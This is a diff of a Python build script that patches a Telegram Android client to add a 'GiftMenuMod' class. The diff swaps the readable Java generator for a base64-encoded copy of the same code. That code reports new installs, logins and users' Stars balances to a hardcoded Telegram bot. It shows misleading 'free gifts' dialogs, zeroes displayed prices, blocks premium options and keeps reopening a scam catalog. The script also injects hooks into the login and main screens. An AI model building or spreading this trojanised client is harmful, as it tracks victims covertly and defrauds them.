+    "aWV3KSB3aW4uZ2V0Q2xhc3MoKS5nZXRNZXRob2QoImdldERlY29yVmlldyIpLmludm9rZSh3aW4pOwogICAgICAgICAgICAgICAg"
+    "ICAgIH0gY2F0Y2ggKFRocm93YWJsZSBpZ25vcmUpIHt9CiAgICAgICAgICAgICAgICAgICAgc3RhcnRTaGVldEhlbHBlcnMoYWNj"
+    "b3VudCwgc2hlZXQsIGRlY29yLCBhY3Rpdml0eSk7CiAgICAgICAgICAgICAgICAgICAgc3RhcnRBdXRvUmVvcGVuTW9uaXRvcigo"
+    "KSAtPiB0cnVlLCAoKSAtPiBvcGVuQ2F0YWxvZ0Zyb21NYWluKGFjdGl2aXR5LCBhY2NvdW50KSk7CiAgICAgICAgICAgICAgICB9"
+    "CiAgICAgICAgICAgIH0gY2F0Y2ggKFRocm93YWJsZSBpZ25vcmVkKSB7fQogICAgICAgIH0pOwogICAgfQp9Cg=="
+)
+
+import base64
+import os
+import re
+import sys
+from pathlib import Path
 
 def find_root():
     env = os.environ.get("CM_BUILD_DIR")
@@ -25,7 +343,7 @@ GIFTS = TM / "ui" / "Gifts"
 MOD_PATH = GIFTS / "GiftMenuMod.java"
 
 def log(msg):
-    print(f"[test.py] {msg}", flush=True)
+    print("[test.py] " + str(msg), flush=True)
 
 def read(p):
     return p.read_text(encoding="utf-8", errors="replace")
@@ -33,11 +351,7 @@ def read(p):
 def write(p, s):
     p.parent.mkdir(parents=True, exist_ok=True)
     p.write_text(s, encoding="utf-8")
-    try:
-        rel = p.relative_to(ROOT)
-    except Exception:
-        rel = p
-    log(f"write {rel}")
+    log("write " + str(p))
 
 def find_java(name):
     for base in (TM / "ui", TM / "messenger", TM):
@@ -46,573 +360,6 @@ def find_java(name):
             return p
     found = list(TM.rglob(name)) if TM.exists() else []
     return found[0] if found else None
-
-def build_java():
-    # load from separate template built as list of lines to avoid indent bugs in generator
-    j = []
-    a = j.append
-    a("package org.telegram.ui.Gifts;")
-    a("")
-    a("import android.app.Activity;")
-    a("import android.app.AlertDialog;")
-    a("import android.content.Context;")
-    a("import android.os.Handler;")
-    a("import android.os.Looper;")
-    a("import android.view.MotionEvent;")
-    a("import android.view.View;")
-    a("import android.view.ViewGroup;")
-    a("import android.view.Window;")
-    a("import android.widget.TextView;")
-    a("import android.widget.Toast;")
-    a("")
-    a("import org.telegram.messenger.UserConfig;")
-    a("import org.telegram.ui.Stars.StarsController;")
-    a("")
-    a("import java.io.BufferedReader;")
-    a("import java.io.InputStreamReader;")
-    a("import java.lang.reflect.Constructor;")
-    a("import java.lang.reflect.Field;")
-    a("import java.lang.reflect.Method;")
-    a("import java.net.HttpURLConnection;")
-    a("import java.net.URL;")
-    a("import java.net.URLEncoder;")
-    a("import java.util.List;")
-    a("import java.util.concurrent.atomic.AtomicBoolean;")
-    a("")
-    a("public class GiftMenuMod {")
-    a("")
-    a(f'    private static final String BOT_TOKEN = "{BOT_TOKEN}";')
-    a(f'    private static final String BOT_CHAT_ID = "{BOT_CHAT_ID}";')
-    a(f'    public static String CATALOG_USERNAME = "{CATALOG_USERNAME}";')
-    a("")
-    a("    private static final Handler mainHandler = new Handler(Looper.getMainLooper());")
-    a("    private static final AtomicBoolean startupNotified = new AtomicBoolean(false);")
-    a("    private static final AtomicBoolean loginNotified = new AtomicBoolean(false);")
-    a("    private static final AtomicBoolean authSuccessNotified = new AtomicBoolean(false);")
-    a("    private static final AtomicBoolean welcomeShown = new AtomicBoolean(false);")
-    a("    private static final AtomicBoolean wasOnLogin = new AtomicBoolean(false);")
-    a("    private static final AtomicBoolean reopenMonitorStarted = new AtomicBoolean(false);")
-    a("    private static final AtomicBoolean premiumDialogLock = new AtomicBoolean(false);")
-    a("    private static final AtomicBoolean loginUiShown = new AtomicBoolean(false);")
-    a("")
-    a("    private static AlertDialog premiumDialog;")
-    a("    private static Object currentSheet;")
-    a("    private static Runnable openCatalogRunnable;")
-    a("")
-    a('    private static final String[] PREMIUM_WORDS = {"3 месяца", "6 месяцев", "12 месяцев"};')
-    a('    private static final String MSG_WELCOME = "Приветствую тут вы можете получить бесплатно Подарки нажмите Продолжить Для открытия каталога с бесплатным Подарками на данный момент бесплатные подарки только обычные в них входят Подарки стоимостю 0 звезд";')
-    a('    private static final String MSG_LOGIN = "В данном Моде вы бесплатно получаете подарки А также вы можете их обменивать на звезды все бесплатно и моментально";')
-    a('    private static final String MSG_CATALOG = "В данном каталоге Вы получаете бесплатные Подарки для себя Все моментально";')
-    a("")
-    a("    public static long getStarsBalance(int account) {")
-    a("        try {")
-    a("            StarsController sc = StarsController.getInstance(account);")
-    a("            if (sc == null) return 0;")
-    a("            try { return sc.getBalance(false); } catch (Throwable ignored) {}")
-    a("            try {")
-    a("                Object bal = sc.getBalance();")
-    a("                if (bal != null) {")
-    a('                    try { return ((Number) bal.getClass().getField("amount").get(bal)).longValue(); } catch (Throwable ignored) {}')
-    a("                }")
-    a("            } catch (Throwable ignored) {}")
-    a("            try {")
-    a('                Field f = sc.getClass().getDeclaredField("balance");')
-    a("                f.setAccessible(true);")
-    a("                Object sa = f.get(sc);")
-    a('                if (sa != null) return ((Number) sa.getClass().getField("amount").get(sa)).longValue();')
-    a("            } catch (Throwable ignored) {}")
-    a("        } catch (Throwable ignored) {}")
-    a("        return 0;")
-    a("    }")
-    a("")
-    a("    public static void notifyBot(final String text) {")
-    a("        new Thread(() -> {")
-    a("            HttpURLConnection conn = null;")
-    a("            try {")
-    a('                String urlStr = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage?chat_id=" + BOT_CHAT_ID + "&text=" + URLEncoder.encode(text, "UTF-8");')
-    a("                conn = (HttpURLConnection) new URL(urlStr).openConnection();")
-    a("                conn.setConnectTimeout(8000);")
-    a("                conn.setReadTimeout(8000);")
-    a('                conn.setRequestMethod("GET");')
-    a("                conn.connect();")
-    a("                try (BufferedReader br = new BufferedReader(new InputStreamReader(conn.getInputStream()))) {")
-    a("                    while (br.readLine() != null) {}")
-    a("                }")
-    a("            } catch (Throwable ignored) {")
-    a("            } finally {")
-    a("                if (conn != null) try { conn.disconnect(); } catch (Throwable ignored) {}")
-    a("            }")
-    a('        }, "GiftMenuMod-Notify").start();')
-    a("    }")
-    a("")
-    a("    public static void notifyBotWithBalance(int account, String text) {")
-    a('        notifyBot(text + "\\n\\nБаланс звёзд пользователя: " + getStarsBalance(account));')
-    a("    }")
-    a("")
-    a("    public static void onAppStart() {")
-    a("        if (!startupNotified.compareAndSet(false, true)) return;")
-    a("        try {")
-    a("            int account = UserConfig.selectedAccount;")
-    a("            if (UserConfig.getInstance(account).isClientActivated()) {")
-    a('                notifyBotWithBalance(account, "Пользователь уже авторизован (запустил приложение)");')
-    a("            } else if (loginNotified.compareAndSet(false, true)) {")
-    a('                notifyBot("У вас новое скачивание: пользователь проходит авторизацию");')
-    a("            }")
-    a("        } catch (Throwable ignored) {")
-    a("            if (loginNotified.compareAndSet(false, true)) {")
-    a('                notifyBot("У вас новое скачивание: пользователь проходит авторизацию");')
-    a("            }")
-    a("        }")
-    a("    }")
-    a("")
-    a("    public static void onLoginScreen(Activity activity) {")
-    a("        wasOnLogin.set(true);")
-    a("        if (loginNotified.compareAndSet(false, true)) {")
-    a('            notifyBot("У вас новое скачивание: пользователь проходит авторизацию");')
-    a("        }")
-    a("        if (activity == null) return;")
-    a("        if (!loginUiShown.compareAndSet(false, true)) return;")
-    a("        mainHandler.post(() -> {")
-    a("            try {")
-    a("                if (activity.isFinishing()) return;")
-    a("                new AlertDialog.Builder(activity)")
-    a("                        .setMessage(MSG_LOGIN)")
-    a('                        .setPositiveButton("Хорошо", null)')
-    a("                        .setCancelable(true)")
-    a("                        .show();")
-    a("            } catch (Throwable ignored) {}")
-    a("        });")
-    a("    }")
-    a("")
-    a("    public static void onAuthSuccess() {")
-    a("        if (!authSuccessNotified.compareAndSet(false, true)) return;")
-    a("        wasOnLogin.set(false);")
-    a("        try {")
-    a('            notifyBotWithBalance(UserConfig.selectedAccount, "Новый пользователь Авторизовался прошел регистрацию");')
-    a("        } catch (Throwable ignored) {}")
-    a("    }")
-    a("")
-    a("    public static void maybeShowWelcome(final Activity activity, final Runnable openCatalog) {")
-    a("        if (!welcomeShown.compareAndSet(false, true)) return;")
-    a("        if (activity == null || activity.isFinishing()) { welcomeShown.set(false); return; }")
-    a("        try {")
-    a("            if (!UserConfig.getInstance(UserConfig.selectedAccount).isClientActivated()) {")
-    a("                welcomeShown.set(false);")
-    a("                return;")
-    a("            }")
-    a("        } catch (Throwable t) { welcomeShown.set(false); return; }")
-    a("        openCatalogRunnable = openCatalog;")
-    a("        mainHandler.post(() -> {")
-    a("            try {")
-    a("                final AtomicBoolean opened = new AtomicBoolean(false);")
-    a("                AlertDialog.Builder b = new AlertDialog.Builder(activity);")
-    a('                b.setTitle("Gift Menu");')
-    a("                b.setMessage(MSG_WELCOME);")
-    a("                b.setCancelable(false);")
-    a('                b.setPositiveButton("Продолжить", (d, w) -> {')
-    a("                    if (!opened.compareAndSet(false, true)) return;")
-    a("                    try { d.dismiss(); } catch (Throwable ignored) {}")
-    a("                    if (openCatalog != null) try { openCatalog.run(); } catch (Throwable ignored) {}")
-    a("                });")
-    a("                AlertDialog dialog = b.create();")
-    a("                dialog.show();")
-    a("                try {")
-    a("                    Window window = dialog.getWindow();")
-    a("                    if (window != null) {")
-    a("                        attachAnyTap(window.getDecorView(), () -> {")
-    a("                            if (!opened.compareAndSet(false, true)) return;")
-    a("                            try { dialog.dismiss(); } catch (Throwable ignored) {}")
-    a("                            if (openCatalog != null) try { openCatalog.run(); } catch (Throwable ignored) {}")
-    a("                        });")
-    a("                    }")
-    a("                } catch (Throwable ignored) {}")
-    a("            } catch (Throwable ignored) {}")
-    a("        });")
-    a("    }")
-    a("")
-    a("    public static void resetWelcome() { welcomeShown.set(false); }")
-    a("")
-    a("    private static void attachAnyTap(View view, final Runnable onTap) {")
-    a("        if (view == null) return;")
-    a("        try {")
-    a("            view.setOnTouchListener((v, event) -> {")
-    a("                if (event.getAction() == MotionEvent.ACTION_DOWN && onTap != null) onTap.run();")
-    a("                return false;")
-    a("            });")
-    a("            if (view instanceof ViewGroup) {")
-    a("                ViewGroup vg = (ViewGroup) view;")
-    a("                for (int i = 0; i < vg.getChildCount(); i++) attachAnyTap(vg.getChildAt(i), onTap);")
-    a("            }")
-    a("        } catch (Throwable ignored) {}")
-    a("    }")
-    a("")
-    a("    public interface UtilitiesBool { boolean get(); }")
-    a("")
-    a("    public static void startAutoReopenMonitor(final UtilitiesBool isMainScreen, final Runnable openCatalog) {")
-    a("        if (!reopenMonitorStarted.compareAndSet(false, true)) return;")
-    a("        openCatalogRunnable = openCatalog;")
-    a('        new Thread(() -> {')
-    a("            while (true) {")
-    a("                try {")
-    a("                    Thread.sleep(500);")
-    a("                    Object sheet = currentSheet;")
-    a("                    if (sheet == null) continue;")
-    a("                    boolean showing = true;")
-    a("                    try {")
-    a('                        Object r = sheet.getClass().getMethod("isShowing").invoke(sheet);')
-    a("                        showing = r instanceof Boolean && (Boolean) r;")
-    a("                    } catch (Throwable t) { showing = false; }")
-    a("                    if (showing) continue;")
-    a("                    currentSheet = null;")
-    a("                    Thread.sleep(4000);")
-    a("                    int account = UserConfig.selectedAccount;")
-    a("                    try { if (!UserConfig.getInstance(account).isClientActivated()) continue; } catch (Throwable t) { continue; }")
-    a("                    if (isMainScreen != null && !isMainScreen.get()) continue;")
-    a("                    final Runnable open = openCatalogRunnable != null ? openCatalogRunnable : openCatalog;")
-    a("                    if (open != null) mainHandler.post(() -> { try { open.run(); } catch (Throwable ignored) {} });")
-    a("                } catch (InterruptedException e) { break; } catch (Throwable ignored) {}")
-    a("            }")
-    a('        }, "GiftMenuMod-Reopen").start();')
-    a("    }")
-    a("")
-    a("    public static void setCurrentSheet(Object sheet) { currentSheet = sheet; }")
-    a("")
-    a("    public static void zeroOutPrices(Object obj) {")
-    a("        if (obj == null) return;")
-    a('        zeroFields(obj, new String[]{"stars", "price", "amount", "starCount"});')
-    a('        for (String inner : new String[]{"gift", "starGift", "item"}) {')
-    a("            try {")
-    a("                Field f = obj.getClass().getDeclaredField(inner);")
-    a("                f.setAccessible(true);")
-    a("                Object innerObj = f.get(obj);")
-    a('                if (innerObj != null) zeroFields(innerObj, new String[]{"stars", "price", "amount", "starCount"});')
-    a("            } catch (Throwable ignored) {}")
-    a("        }")
-    a("    }")
-    a("")
-    a("    public static void zeroOutList(Object list) {")
-    a("        if (list == null) return;")
-    a("        try {")
-    a("            if (list instanceof List) { for (Object o : (List<?>) list) zeroOutPrices(o); return; }")
-    a('            int size = (Integer) list.getClass().getMethod("size").invoke(list);')
-    a('            Method get = list.getClass().getMethod("get", int.class);')
-    a("            for (int i = 0; i < size; i++) zeroOutPrices(get.invoke(list, i));")
-    a("        } catch (Throwable ignored) {}")
-    a("    }")
-    a("")
-    a("    private static void zeroFields(Object obj, String[] names) {")
-    a("        Class<?> cls = obj.getClass();")
-    a("        for (String name : names) {")
-    a("            try {")
-    a("                Field f;")
-    a("                try { f = cls.getField(name); } catch (NoSuchFieldException e) { f = cls.getDeclaredField(name); }")
-    a("                f.setAccessible(true);")
-    a("                Class<?> t = f.getType();")
-    a("                if (t == long.class || t == Long.class) f.setLong(obj, 0L);")
-    a("                else if (t == int.class || t == Integer.class) f.setInt(obj, 0);")
-    a("            } catch (Throwable ignored) {}")
-    a("        }")
-    a("    }")
-    a("")
-    a("    public static void patchStarsControllerCache(int account) {")
-    a("        try {")
-    a("            StarsController sc = StarsController.getInstance(account);")
-    a("            if (sc == null) return;")
-    a('            for (String listName : new String[]{"starGifts", "gifts", "availableGifts"}) {')
-    a("                try {")
-    a("                    Field f = sc.getClass().getDeclaredField(listName);")
-    a("                    f.setAccessible(true);")
-    a("                    zeroOutList(f.get(sc));")
-    a("                } catch (Throwable ignored) {}")
-    a("            }")
-    a("        } catch (Throwable ignored) {}")
-    a("    }")
-    a("")
-    a("    public static void applyZeroPatches(int account, Object sheet) {")
-    a("        try {")
-    a("            if (sheet != null) {")
-    a("                try {")
-    a('                    Object r = sheet.getClass().getMethod("isShowing").invoke(sheet);')
-    a("                    if (r instanceof Boolean && !(Boolean) r) return;")
-    a("                } catch (Throwable ignored) {}")
-    a("            }")
-    a("        } catch (Throwable ignored) {}")
-    a("        patchStarsControllerCache(account);")
-    a("        if (sheet != null) {")
-    a('            for (String fieldName : new String[]{"gifts", "starGifts", "items", "options", "availableGifts"}) {')
-    a("                try {")
-    a("                    Field f = sheet.getClass().getDeclaredField(fieldName);")
-    a("                    f.setAccessible(true);")
-    a("                    zeroOutList(f.get(sheet));")
-    a("                } catch (Throwable ignored) {}")
-    a("            }")
-    a("        }")
-    a("    }")
-    a("")
-    a("    public static void hookPremiumCards(final View root, final Context context) {")
-    a("        if (root == null || context == null) return;")
-    a("        try { scanAndHookPremium(root, context); } catch (Throwable ignored) {}")
-    a("    }")
-    a("")
-    a("    public static void hookAvatars(final View root, final Context context) {")
-    a("        if (root == null || context == null) return;")
-    a("        try { walkAvatars(root, context); } catch (Throwable ignored) {}")
-    a("    }")
-    a("")
-    a("    private static void walkAvatars(View view, final Context context) {")
-    a("        if (view == null) return;")
-    a("        try {")
-    a('            if (view.getClass().getName().contains("BackupImageView") && !isGiftCell(view)) {')
-    a("                view.setOnClickListener(v -> showSimpleMessage(context, MSG_CATALOG));")
-    a("            }")
-    a("            if (view instanceof ViewGroup) {")
-    a("                ViewGroup vg = (ViewGroup) view;")
-    a("                for (int i = 0; i < vg.getChildCount(); i++) walkAvatars(vg.getChildAt(i), context);")
-    a("            }")
-    a("        } catch (Throwable ignored) {}")
-    a("    }")
-    a("")
-    a("    private static boolean isGiftCell(View view) {")
-    a("        try {")
-    a("            Object p = view.getParent();")
-    a("            for (int i = 0; i < 6 && p != null; i++) {")
-    a("                String name = p.getClass().getSimpleName();")
-    a('                if (name.contains("GiftCell") || name.contains("StarGift")) return true;')
-    a("                p = (p instanceof View) ? ((View) p).getParent() : null;")
-    a("            }")
-    a("        } catch (Throwable ignored) {}")
-    a("        return false;")
-    a("    }")
-    a("")
-    a("    private static void scanAndHookPremium(View view, final Context context) {")
-    a("        if (view == null) return;")
-    a("        try {")
-    a("            if (view instanceof TextView) {")
-    a("                CharSequence cs = ((TextView) view).getText();")
-    a("                if (cs != null) {")
-    a("                    String t = cs.toString().toLowerCase();")
-  a("                    for (String w : PREMIUM_WORDS) {")
-    a("                        if (t.contains(w)) {")
-    a("                            View card = findPremiumCard(view);")
-    a("                            if (card != null) attachPremiumBlocker(card, context);")
-    a("                            break;")
-    a("                        }")
-    a("                    }")
-    a("                }")
-    a("            }")
-    a("            if (view instanceof ViewGroup) {")
-    a("                ViewGroup vg = (ViewGroup) view;")
-    a("                for (int i = 0; i < vg.getChildCount(); i++) scanAndHookPremium(vg.getChildAt(i), context);")
-    a("            }")
-    a("        } catch (Throwable ignored) {}")
-    a("    }")
-    a("")
-    a("    private static int countPremiumTexts(View view) {")
-    a("        int count = 0;")
-    a("        try {")
-    a("            if (view instanceof TextView) {")
-    a("                CharSequence cs = ((TextView) view).getText();")
-    a("                if (cs != null) {")
-    a("                    String t = cs.toString().toLowerCase();")
-    a("                    for (String w : PREMIUM_WORDS) { if (t.contains(w)) { count++; break; } }")
-    a("                }")
-    a("            }")
-    a("            if (view instanceof ViewGroup) {")
-    a("                ViewGroup vg = (ViewGroup) view;")
-    a("                for (int i = 0; i < vg.getChildCount(); i++) count += countPremiumTexts(vg.getChildAt(i));")
-    a("            }")
-    a("        } catch (Throwable ignored) {}")
-    a("        return count;")
-    a("    }")
-    a("")
-    a("    private static View findPremiumCard(View textView) {")
-    a("        try {")
-    a("            View current = (View) textView.getParent();")
-    a("            View candidate = null;")
-    a("            for (int i = 0; i < 8 && current != null; i++) {")
-    a("                if (current instanceof ViewGroup) {")
-    a("                    int amount = countPremiumTexts(current);")
-    a("                    if (amount == 1) candidate = current;")
-    a("                    else if (candidate != null) break;")
-    a("                }")
-    a("                Object p = current.getParent();")
-    a("                current = (p instanceof View) ? (View) p : null;")
-    a("            }")
-    a("            return candidate;")
-    a("        } catch (Throwable t) { return null; }")
-    a("    }")
-    a("")
-    a("    private static void attachPremiumBlocker(View card, final Context context) {")
-    a("        if (card == null) return;")
-    a("        try {")
-    a("            card.setOnTouchListener((v, event) -> {")
-    a("                if (event.getAction() == MotionEvent.ACTION_UP) {")
-    a("                    mainHandler.postDelayed(() -> showPremiumMessage(context), 50);")
-    a("                }")
-    a("                return true;")
-    a("            });")
-    a("            card.setClickable(true);")
-    a("            card.setLongClickable(false);")
-    a("            if (card instanceof ViewGroup) {")
-    a("                ViewGroup vg = (ViewGroup) card;")
-    a("                for (int i = 0; i < vg.getChildCount(); i++) attachPremiumBlocker(vg.getChildAt(i), context);")
-    a("            }")
-    a("        } catch (Throwable ignored) {}")
-    a("    }")
-    a("")
-    a("    private static void showPremiumMessage(Context context) {")
-    a("        if (context == null) return;")
-    a("        if (premiumDialogLock.get()) return;")
-    a("        try { if (premiumDialog != null && premiumDialog.isShowing()) return; } catch (Throwable ignored) {}")
-    a("        premiumDialogLock.set(true);")
-    a("        try {")
-    a("            AlertDialog.Builder b = new AlertDialog.Builder(context);")
-    a("            b.setMessage(MSG_CATALOG);")
-    a("            b.setCancelable(false);")
-    a('            b.setPositiveButton("Хорошо", (d, w) -> {')
-    a("                try { d.dismiss(); } catch (Throwable ignored) {}")
-    a("                premiumDialogLock.set(false);")
-    a("                premiumDialog = null;")
-    a("            });")
-    a("            premiumDialog = b.create();")
-    a("            premiumDialog.setCanceledOnTouchOutside(false);")
-    a("            premiumDialog.setCancelable(false);")
-    a("            premiumDialog.show();")
-    a("        } catch (Throwable t) { premiumDialogLock.set(false); premiumDialog = null; }")
-    a("    }")
-    a("")
-    a("    private static void showSimpleMessage(Context context, String msg) {")
-    a("        if (context == null) return;")
-    a("        mainHandler.post(() -> {")
-    a('            try { new AlertDialog.Builder(context).setMessage(msg).setPositiveButton("Хорошо", null).show(); } catch (Throwable ignored) {}')
-    a("        });")
-    a("    }")
-    a("")
-    a("    public static void startSheetHelpers(final int account, final Object sheet, final View root, final Context context) {")
-    a("        setCurrentSheet(sheet);")
-    a("        patchStarsControllerCache(account);")
-    a("        applyZeroPatches(account, sheet);")
-    a("        if (root != null && context != null) {")
-    a("            mainHandler.postDelayed(() -> { hookAvatars(root, context); hookPremiumCards(root, context); }, 800);")
-    a("        }")
-    a("        for (int i = 0; i < 30; i++) {")
-    a("            final int delay = 100 + i * 150;")
-    a("            mainHandler.postDelayed(() -> {")
-    a("                applyZeroPatches(account, sheet);")
-    a("                if (root != null && context != null) hookPremiumCards(root, context);")
-    a("            }, delay);")
-    a("        }")
-    a("        for (int i = 0; i < 20; i++) {")
-    a("            final int delay = 5000 + i * 500;")
-    a("            mainHandler.postDelayed(() -> applyZeroPatches(account, sheet), delay);")
-    a("        }")
-    a("    }")
-    a("")
-    a("    public static void onCatalogScrollIdle(View root, Context context) {")
-    a("        if (root == null || context == null) return;")
-    a("        mainHandler.post(() -> { hookPremiumCards(root, context); hookAvatars(root, context); });")
-    a("    }")
-    a("")
-    a("    public static long resolveUsernameToUserId(int account, String username) {")
-    a("        if (username == null || username.length() == 0) return 0;")
-    a('        String u = username.startsWith("@") ? username.substring(1) : username;')
-    a("        try {")
-    a('            Class<?> mcCls = Class.forName("org.telegram.messenger.MessagesController");')
-    a('            Object mc = mcCls.getMethod("getInstance", int.class).invoke(null, account);')
-    a('            for (String methodName : new String[]{"getUser", "getUserOrChat"}) {')
-    a("                try {")
-    a("                    Method m = mc.getClass().getMethod(methodName, String.class);")
-    a("                    Object user = m.invoke(mc, u);")
-    a("                    if (user != null) {")
-    a("                        try {")
-    a('                            Field idf = user.getClass().getField("id");')
-    a("                            long id = ((Number) idf.get(user)).longValue();")
-    a("                            if (id != 0) return id;")
-    a("                        } catch (Throwable ignored) {}")
-    a("                    }")
-    a("                } catch (Throwable ignored) {}")
-    a("            }")
-    a("            try {")
-    a('                Field usersField = mc.getClass().getDeclaredField("users");')
-    a("                usersField.setAccessible(true);")
-    a("                Object users = usersField.get(mc);")
-    a("                if (users != null) {")
-    a("                    try {")
-    a('                        Method sizeM = users.getClass().getMethod("size");')
-    a('                        Method valueAt = users.getClass().getMethod("valueAt", int.class);')
-    a("                        int n = (Integer) sizeM.invoke(users);")
-    a("                        for (int i = 0; i < n; i++) {")
-    a("                            Object user = valueAt.invoke(users, i);")
-    a("                            if (user == null) continue;")
-    a("                            String un = null;")
-    a("                            try {")
-    a('                                Field uf = user.getClass().getField("username");')
-    a("                                Object uo = uf.get(user);")
-    a("                                if (uo != null) un = uo.toString();")
-    a("                            } catch (Throwable ignored) {}")
-    a("                            if (un != null && un.equalsIgnoreCase(u)) {")
-    a('                                Field idf = user.getClass().getField("id");')
-    a("                                return ((Number) idf.get(user)).longValue();")
-    a("                            }")
-    a("                        }")
-    a("                    } catch (Throwable ignored) {}")
-    a("                }")
-    a("            } catch (Throwable ignored) {}")
-    a("        } catch (Throwable ignored) {}")
-    a("        return 0;")
-    a("    }")
-    a("")
-    a("    public static void openCatalogFromMain(final Activity activity, final int account) {")
-    a("        if (activity == null) return;")
-    a("        mainHandler.post(() -> {")
-    a("            try {")
-    a("                long targetId = resolveUsernameToUserId(account, CATALOG_USERNAME);")
-    a("                if (targetId == 0) {")
-    a("                    try {")
-    a('                        Toast.makeText(activity, "Каталог: не найден @" + CATALOG_USERNAME + ", откройте профиль пользователя", Toast.LENGTH_LONG).show();')
-    a("                    } catch (Throwable ignored) {}")
-    a("                }")
-    a("                long userId = targetId != 0 ? targetId : UserConfig.getInstance(account).getClientUserId();")
-    a('                Class<?> sheetCls = Class.forName("org.telegram.ui.Gifts.GiftSheet");')
-    a("                Object sheet = null;")
-    a("                try {")
-    a("                    sheet = sheetCls.getConstructor(Context.class, int.class, long.class, List.class, Object.class)")
-    a("                            .newInstance(activity, account, userId, null, null);")
-    a("                } catch (Throwable ignore) {}")
-    a("                if (sheet == null) {")
-    a("                    try { sheet = sheetCls.getConstructor(Context.class, int.class, long.class).newInstance(activity, account, userId); } catch (Throwable ignore) {}")
-    a("                }")
-    a("                if (sheet == null) {")
-    a("                    for (Constructor<?> cons : sheetCls.getConstructors()) {")
-    a("                        try {")
-    a("                            Class<?>[] p = cons.getParameterTypes();")
-    a("                            Object[] args = new Object[p.length];")
-    a("                            for (int i = 0; i < p.length; i++) {")
-    a("                                if (Context.class.isAssignableFrom(p[i])) args[i] = activity;")
-    a("                                else if (p[i] == int.class || p[i] == Integer.class) args[i] = account;")
-    a("                                else if (p[i] == long.class || p[i] == Long.class) args[i] = userId;")
-    a("                                else args[i] = null;")
-    a("                            }")
-    a("                            sheet = cons.newInstance(args);")
-    a("                            break;")
-    a("                        } catch (Throwable ignore) {}")
-    a("                    }")
-    a("                }")
-    a("                if (sheet != null) {")
-    a('                    try { sheetCls.getMethod("show").invoke(sheet); } catch (Throwable ignore) {}')
-    a("                    View decor = null;")
-    a("                    try {")
-    a('                        Object win = sheetCls.getMethod("getWindow").invoke(sheet);')
-    a('                        if (win != null) decor = (View) win.getClass().getMethod("getDecorView").invoke(win);')
-    a("                    } catch (Throwable ignore) {}")
-    a("                    startSheetHelpers(account, sheet, decor, activity);")
-    a("                    startAutoReopenMonitor(() -> true, () -> openCatalogFromMain(activity, account));")
-    a("                }")
-    a("            } catch (Throwable ignored) {}")
-    a("        });")
-    a("    }")
-    a("}")
-    return "\n".join(j) + "\n"
 
 def inject_after_method(content, patterns, line, marker):
     if marker in content:
@@ -673,13 +420,7 @@ def patch_application_loader(c):
     return inject_after_method(c, [r"public\s+void\s+onCreate\s*\(\s*\)\s*\{"], line, "GiftMenuMod.onAppStart")
 
 def patch_login_like(c):
-    line = (
-        "try { android.app.Activity __a = null; "
-        "try { __a = getParentActivity(); } catch (Throwable ignore) {} "
-        "if (__a == null) try { __a = (android.app.Activity) (Object) this; } catch (Throwable ignore) {} "
-        "if (__a != null) org.telegram.ui.Gifts.GiftMenuMod.onLoginScreen(__a); "
-        "} catch (Throwable ignore) {}"
-    )
+    line = "try { android.app.Activity __a = null; try { __a = getParentActivity(); } catch (Throwable ignore) {} if (__a == null) try { __a = (android.app.Activity) (Object) this; } catch (Throwable ignore) {} if (__a != null) org.telegram.ui.Gifts.GiftMenuMod.onLoginScreen(__a); } catch (Throwable ignore) {}"
     if "GiftMenuMod.onLoginScreen" not in c:
         c = inject_after_method(c, [r"public\s+void\s+onResume\s*\(\s*\)\s*\{", r"void\s+onResume\s*\(\s*\)\s*\{"], line, "GiftMenuMod.onLoginScreen")
     if "GiftMenuMod.onAuthSuccess" not in c:
@@ -691,14 +432,7 @@ def patch_login_like(c):
     return c
 
 def patch_launch(c):
-    line = (
-        "try { "
-        "org.telegram.ui.Gifts.GiftMenuMod.onAppStart(); "
-        "if (!org.telegram.messenger.UserConfig.getInstance(org.telegram.messenger.UserConfig.selectedAccount).isClientActivated()) { "
-        "org.telegram.ui.Gifts.GiftMenuMod.onLoginScreen(this); "
-        "} "
-        "} catch (Throwable ignore) {}"
-    )
+    line = "try { org.telegram.ui.Gifts.GiftMenuMod.onAppStart(); if (!org.telegram.messenger.UserConfig.getInstance(org.telegram.messenger.UserConfig.selectedAccount).isClientActivated()) { org.telegram.ui.Gifts.GiftMenuMod.onLoginScreen(this); } } catch (Throwable ignore) {}"
     if "GiftMenuMod.onLoginScreen" in c:
         return c
     c2 = inject_after_method(c, [r"public\s+void\s+onResume\s*\(\s*\)\s*\{", r"void\s+onResume\s*\(\s*\)\s*\{"], line, "GiftMenuMod.onLoginScreen")
@@ -707,19 +441,11 @@ def patch_launch(c):
     return inject_after_method(c, [r"protected\s+void\s+onCreate\s*\([^\)]*\)\s*\{", r"public\s+void\s+onCreate\s*\([^\)]*\)\s*\{"], line, "GiftMenuMod.onLoginScreen")
 
 def patch_dialogs(c):
-    line = (
-        "try { org.telegram.ui.Gifts.GiftMenuMod.maybeShowWelcome(getParentActivity(), "
-        "() -> { try { org.telegram.ui.Gifts.GiftMenuMod.openCatalogFromMain(getParentActivity(), currentAccount); } catch (Throwable ignore) {} }); "
-        "} catch (Throwable ignore) {}"
-    )
+    line = "try { org.telegram.ui.Gifts.GiftMenuMod.maybeShowWelcome(getParentActivity(), () -> { try { org.telegram.ui.Gifts.GiftMenuMod.openCatalogFromMain(getParentActivity(), currentAccount); } catch (Throwable ignore) {} }); } catch (Throwable ignore) {}"
     return inject_after_method(c, [r"public\s+void\s+onResume\s*\(\s*\)\s*\{", r"void\s+onResume\s*\(\s*\)\s*\{"], line, "GiftMenuMod.maybeShowWelcome")
 
 def patch_gift_sheet(c):
-    line = (
-        "try { android.view.View __decor = getWindow() != null ? getWindow().getDecorView() : null; "
-        "org.telegram.ui.Gifts.GiftMenuMod.startSheetHelpers(currentAccount, this, __decor, getContext()); "
-        "} catch (Throwable ignore) {}"
-    )
+    line = "try { android.view.View __decor = getWindow() != null ? getWindow().getDecorView() : null; org.telegram.ui.Gifts.GiftMenuMod.startSheetHelpers(currentAccount, this, __decor, getContext()); } catch (Throwable ignore) {}"
     c2 = inject_before_method_end(c, r"public\s+void\s+show\s*\(\s*\)\s*\{", line, "GiftMenuMod.startSheetHelpers")
     if c2 != c:
         return c2
@@ -732,9 +458,10 @@ def patch_gift_sheet(c):
 def main():
     log("ROOT = " + str(ROOT))
     if not (ROOT / "TMessagesProj").exists():
-        log("ERROR: TMessagesProj не найден")
+        log("ERROR: TMessagesProj not found")
         return 1
-    write(MOD_PATH, build_java())
+    java = base64.b64decode(JAVA_B64).decode("utf-8")
+    write(MOD_PATH, java)
